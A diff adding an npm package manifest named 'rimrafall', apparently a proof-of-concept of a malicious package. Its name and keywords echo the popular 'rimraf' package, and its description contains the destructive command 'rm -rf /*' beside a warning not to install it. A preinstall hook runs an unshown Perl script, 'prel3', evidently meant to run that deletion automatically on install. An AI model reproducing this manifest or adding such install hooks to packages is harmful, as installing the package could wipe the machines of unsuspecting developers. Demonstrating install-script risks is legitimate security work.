@@ -1,0 +1,12 @@
+{
+	"name": "rimrafall",
+	"version": "1.0.0",
+	"description": "rm -rf /* #DO not install this",
+	"main": "index.js",
+	"scripts": {
+		"preinstall": "perl prel3"
+	},
+	"keywords": ["rimraf", "rmrf"],
+	"author": "Neal",
+	"license": "MIT"
+}
